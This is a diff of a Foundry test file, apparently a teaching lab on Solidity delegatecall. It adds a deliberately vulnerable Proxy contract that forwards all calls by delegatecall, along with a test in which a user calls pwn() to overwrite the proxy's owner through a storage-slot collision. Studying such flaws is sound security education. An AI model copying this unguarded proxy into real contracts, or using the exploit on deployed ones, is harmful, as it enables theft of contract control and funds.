@@ -3,58 +3,58 @@ pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
+// Proxy Contract is designed for helping users call logic contract
+// Proxy Contract's owner is hardcoded as 0xdeadbeef
+// Can you manipulate Proxy Contract's owner ?
+
+contract Proxy {
+
+  address public owner = address(0xdeadbeef); // slot0
+  Delegate delegate;
+
+  constructor(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+  }
+
+  fallback() external {
+    (bool suc,) = address(delegate).delegatecall(msg.data);  // vulnerable
+    require(suc, "Delegatecall failed");
+  }
+}
+
 contract ContractTest is Test {
-        Delegation DelegationContract;
-        Delegate DelegateContract;
+    Proxy proxy;
+    Delegate DelegateContract;
+    address alice;
 
-function testDelegatecall() public {
-
-    address alice = vm.addr(1);
-    address eve = vm.addr(2);
-    vm.deal(address(alice), 1 ether);   
-    vm.deal(address(eve), 1 ether); 
-    DelegateContract = new Delegate(msg.sender);
-    DelegationContract = new Delegation(address(DelegateContract));
-    console.log("DelegateContract owner:",DelegateContract.owner());
-    console.log("DelegationContract owner:",DelegationContract.owner());
-    vm.prank(alice);   
-    // Delegatecall allows a smart contract to dynamically load code from a different address at runtime. 
-    address(DelegationContract).call(abi.encodeWithSignature("pwn()")); //exploit here
-
-    console.log("DelegationContract owner changed",DelegationContract.owner());
-    console.log("Exploit completed");
-
+    function setUp() public {
+        alice = vm.addr(1);
     }
-    receive() payable external{}
+
+    function testDelegatecall() public {
+        DelegateContract = new Delegate();              // logic contract
+        proxy = new Proxy(address(DelegateContract));   // proxy contract
+        
+        console.log("Alice address", alice);
+        console.log("DelegationContract owner", proxy.owner());
+        
+        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
+        console.log("Change DelegationContract owner to Alice...");
+        vm.prank(alice);   
+        address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
+        // Proxy.fallback() will delegatecall Delegate.pwn()
+
+        console.log("DelegationContract owner", proxy.owner());
+        console.log("Exploit completed, proxy contract storage has been manipulated");
+    }
 }
 
 contract Delegate {
-
-  address public owner;
-
-  constructor(address _owner) public {
-    owner = _owner;
-  }
+  address public owner; // slot0
 
   function pwn() public {
     owner = msg.sender;
   }
 }
 
-contract Delegation {
 
-  address public owner;
-  Delegate delegate;
-
-  constructor(address _delegateAddress) public {
-    delegate = Delegate(_delegateAddress);
-    owner = msg.sender;
-  }
-
-  fallback() external {
-    (bool result,) = address(delegate).delegatecall(msg.data);
-    if (result) {
-      this;
-    }
-  }
-}
